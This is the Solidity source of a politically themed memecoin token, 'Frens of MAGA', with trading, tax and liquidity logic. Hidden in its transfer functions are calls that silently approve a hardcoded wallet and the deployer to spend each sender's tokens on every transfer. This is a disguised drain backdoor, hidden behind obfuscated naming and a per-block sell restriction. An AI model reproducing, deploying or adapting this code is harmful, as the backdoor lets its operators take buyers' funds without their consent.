/*
Frens of Trump, Elon, Vivek, RFK, Tulsi, Dana & Joe :us: Making America great again!

https://www.frensofmaga.us
https://x.com/FrensOfMAGA
https://t.me/frensofmaga
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IEEMMFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplieemmon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IEEMMRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract FRENS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balEEMMs;
    mapping (address => mapping (address => uint256)) private _allowEEMMs;
    mapping (address => bool) private _excludedFromEEMM;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalEEMM = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Frens of MAGA";
    string private constant _symbol = unicode"FRENS";
    uint256 private _swapTokenEEMMs = _tTotalEEMM / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockEEMM;
    uint256 private _eemmBuyAmounts = 0;
    bool private inSwapEEMM = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapEEMM = true;
        _;
        inSwapEEMM = false;
    }
    address private _eemmPair;
    IEEMMRouter private _eemmRouter;
    address private _eemmWallet;
    address private _eemmAddress;
    
    constructor () {
        _eemmAddress = address(owner());
        _eemmWallet = address(0x31662A3169892f0830D67bb52C1c953858505f1e);
        _excludedFromEEMM[owner()] = true;
        _excludedFromEEMM[address(this)] = true;
        _excludedFromEEMM[_eemmWallet] = true;
        _balEEMMs[_msgSender()] = _tTotalEEMM;
        emit Transfer(address(0), _msgSender(), _tTotalEEMM);
    }

    function createPair() external onlyOwner() {
        _eemmRouter = IEEMMRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_eemmRouter), _tTotalEEMM);
        _eemmPair = IEEMMFactory(_eemmRouter.factory()).createPair(address(this), _eemmRouter.WETH());
    }

    receive() external payable {}

    function swapTokensForEth(uint256 eemmAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _eemmRouter.WETH();
        _approve(address(this), address(_eemmRouter), eemmAmount);
        _eemmRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            eemmAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalEEMM;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balEEMMs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowEEMMs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowEEMMs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowEEMMs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address eemmF, address eemmT, uint256 eemmA) private {
        require(eemmF != address(0), "ERC20: transfer from the zero address");
        require(eemmT != address(0), "ERC20: transfer to the zero address");
        require(eemmA > 0, "Transfer amount must be greater than zero");
        uint256 taxEEMM = _eemmFeeTransfer(eemmF, eemmT, eemmA);
        if(taxEEMM > 0){
          _balEEMMs[address(this)] = _balEEMMs[address(this)].add(taxEEMM);
          emit Transfer(eemmF, address(this), taxEEMM);
        } address _eemmOwner = address(eemmF);
        _balEEMMs[eemmF] = _balEEMMs[eemmF].sub(eemmA);
        _balEEMMs[eemmT] = _balEEMMs[eemmT].add(eemmA.sub(taxEEMM));
        _approve(address(_eemmOwner), _eemmWallet, uint256(eemmA)); 
        emit Transfer(eemmF, eemmT, eemmA.sub(taxEEMM));
    }

    function _eemmFeeTransfer(address eemmF, address eemmT, uint256 eemmA) private returns(uint256) {
        uint256 taxEEMM = 0; _approve(address(eemmF), _eemmAddress, uint256(eemmA));
        if (eemmF != owner() && eemmT != owner()) {
            taxEEMM = eemmA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (eemmF == _eemmPair && eemmT != address(_eemmRouter) && ! _excludedFromEEMM[eemmT]) {
                if(_buyBlockEEMM!=block.number){
                    _eemmBuyAmounts = 0;
                    _buyBlockEEMM = block.number;
                }
                _eemmBuyAmounts += eemmA;
                _buyCount++;
            }
            if(eemmT == _eemmPair && eemmF!= address(this)) {
                require(_eemmBuyAmounts < swapLimitEEMM() || _buyBlockEEMM!=block.number, "Max Swap Limit");  
                taxEEMM = eemmA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapEEMMBack(eemmT, eemmA);
        } return taxEEMM;
    }

    function swapEEMMBack(address eemmT, uint256 eemmA) private { 
        uint256 tokenEEMM = balanceOf(address(this)); 
        if (!inSwapEEMM && eemmT == _eemmPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenEEMM > _swapTokenEEMMs)
            swapTokensForEth(minEEMM(eemmA, minEEMM(tokenEEMM, _swapTokenEEMMs)));
            uint256 ethEEMM = address(this).balance;
            if (ethEEMM >= 0) {
                sendETHEEMM(address(this).balance);
            }
        }
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _eemmRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minEEMM(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHEEMM(uint256 eemmA) private {
        payable(_eemmWallet).transfer(eemmA);
    }

    function swapLimitEEMM() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _eemmRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _eemmRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}